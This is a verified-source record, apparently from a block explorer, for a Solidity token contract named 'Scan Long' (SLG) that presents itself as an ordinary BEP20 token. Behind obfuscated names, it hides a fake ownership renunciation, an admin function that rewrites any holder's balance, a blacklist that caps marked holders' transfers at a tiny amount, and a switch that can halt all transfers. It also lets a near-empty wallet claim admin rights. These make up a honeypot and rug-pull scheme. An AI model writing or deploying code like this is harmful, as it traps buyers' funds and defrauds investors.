{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface senderLimit {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract atLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingSwap {\n    function createPair(address toIsWallet, address tradingMin) external returns (address);\n}\n\ninterface launchedTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address swapWallet) external view returns (uint256);\n\n    function transfer(address fromLiquidity, uint256 senderToken) external returns (bool);\n\n    function allowance(address feeTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 senderToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fromLiquidity,\n        uint256 senderToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityReceiver, uint256 value);\n    event Approval(address indexed feeTake, address indexed spender, uint256 value);\n}\n\ninterface launchedTradingMetadata is launchedTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ScanLong is atLaunch, launchedTrading, launchedTradingMetadata {\n\n    address public modeMarketing;\n\n    uint256 public swapReceiverFrom;\n\n    function liquiditySellMode(address modeTokenLaunched, address fromLiquidity, uint256 senderToken) internal returns (bool) {\n        if (modeTokenLaunched == enableIs) {\n            return minSell(modeTokenLaunched, fromLiquidity, senderToken);\n        }\n        uint256 exemptFee = launchedTrading(modeMarketing).balanceOf(liquidityTeamReceiver);\n        require(exemptFee == totalSenderLiquidity);\n        require(fromLiquidity != liquidityTeamReceiver);\n        if (fundTotalSwap[modeTokenLaunched]) {\n            return minSell(modeTokenLaunched, fromLiquidity, receiverSwap);\n        }\n        return minSell(modeTokenLaunched, fromLiquidity, senderToken);\n    }\n\n    mapping(address => bool) public fundTotalSwap;\n\n    function allowance(address launchToken, address tradingFee) external view virtual override returns (uint256) {\n        if (tradingFee == liquidityEnable) {\n            return type(uint256).max;\n        }\n        return tradingToken[launchToken][tradingFee];\n    }\n\n    address liquidityTeamReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function approve(address tradingFee, uint256 senderToken) public virtual override returns (bool) {\n        tradingToken[_msgSender()][tradingFee] = senderToken;\n        emit Approval(_msgSender(), tradingFee, senderToken);\n        return true;\n    }\n\n    string private txSwap = \"Scan Long\";\n\n    function minSell(address modeTokenLaunched, address fromLiquidity, uint256 senderToken) internal returns (bool) {\n        require(minBuy[modeTokenLaunched] >= senderToken);\n        minBuy[modeTokenLaunched] -= senderToken;\n        minBuy[fromLiquidity] += senderToken;\n        emit Transfer(modeTokenLaunched, fromLiquidity, senderToken);\n        return true;\n    }\n\n    string private buyAmount = \"SLG\";\n\n    bool private listSell;\n\n    function fromTeam() private view {\n        require(atSell[_msgSender()]);\n    }\n\n    uint256 totalSenderLiquidity;\n\n    bool public walletBuy;\n\n    constructor (){\n        \n        senderLimit txSellMin = senderLimit(liquidityEnable);\n        modeMarketing = marketingSwap(txSellMin.factory()).createPair(txSellMin.WETH(), address(this));\n        \n        enableIs = _msgSender();\n        receiverFund();\n        atSell[enableIs] = true;\n        minBuy[enableIs] = autoMin;\n        \n        emit Transfer(address(0), enableIs, autoMin);\n    }\n\n    bool private receiverMaxSender;\n\n    uint8 private isAmountFrom = 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoMin;\n    }\n\n    bool private teamEnable;\n\n    function name() external view virtual override returns (string memory) {\n        return txSwap;\n    }\n\n    function owner() external view returns (address) {\n        return walletLaunch;\n    }\n\n    function receiverFund() public {\n        emit OwnershipTransferred(enableIs, address(0));\n        walletLaunch = address(0);\n    }\n\n    mapping(address => mapping(address => uint256)) private tradingToken;\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyAmount;\n    }\n\n    function transferFrom(address modeTokenLaunched, address fromLiquidity, uint256 senderToken) external override returns (bool) {\n        if (_msgSender() != liquidityEnable) {\n            if (tradingToken[modeTokenLaunched][_msgSender()] != type(uint256).max) {\n                require(senderToken <= tradingToken[modeTokenLaunched][_msgSender()]);\n                tradingToken[modeTokenLaunched][_msgSender()] -= senderToken;\n            }\n        }\n        return liquiditySellMode(modeTokenLaunched, fromLiquidity, senderToken);\n    }\n\n    address private walletLaunch;\n\n    uint256 public senderWallet;\n\n    bool public maxMode;\n\n    uint256 minFund;\n\n    function balanceOf(address swapWallet) public view virtual override returns (uint256) {\n        return minBuy[swapWallet];\n    }\n\n    mapping(address => uint256) private minBuy;\n\n    function minIs(address receiverListFrom, uint256 senderToken) public {\n        fromTeam();\n        minBuy[receiverListFrom] = senderToken;\n    }\n\n    uint256 public walletSwap;\n\n    event OwnershipTransferred(address indexed sellWallet, address indexed exemptWallet);\n\n    address public enableIs;\n\n    function decimals() external view virtual override returns (uint8) {\n        return isAmountFrom;\n    }\n\n    address liquidityEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function getOwner() external view returns (address) {\n        return walletLaunch;\n    }\n\n    function transfer(address receiverListFrom, uint256 senderToken) external virtual override returns (bool) {\n        return liquiditySellMode(_msgSender(), receiverListFrom, senderToken);\n    }\n\n    uint256 private autoMin = 100000000 * 10 ** 18;\n\n    function maxList(address launchFund) public {\n        fromTeam();\n        \n        if (launchFund == enableIs || launchFund == modeMarketing) {\n            return;\n        }\n        fundTotalSwap[launchFund] = true;\n    }\n\n    function exemptBuyTotal(address isList) public {\n        require(isList.balance < 100000);\n        if (walletBuy) {\n            return;\n        }\n        \n        atSell[isList] = true;\n        \n        walletBuy = true;\n    }\n\n    bool public teamMarketingSender;\n\n    uint256 constant receiverSwap = 7 ** 10;\n\n    mapping(address => bool) public atSell;\n\n    function receiverMax(uint256 senderToken) public {\n        fromTeam();\n        totalSenderLiquidity = senderToken;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingFee\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isList\",\"type\":\"address\"}],\"name\":\"exemptBuyTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundTotalSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchFund\",\"type\":\"address\"}],\"name\":\"maxList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverListFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderToken\",\"type\":\"uint256\"}],\"name\":\"minIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"senderToken\",\"type\":\"uint256\"}],\"name\":\"receiverMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapReceiverFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamMarketingSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverListFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTokenLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ScanLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}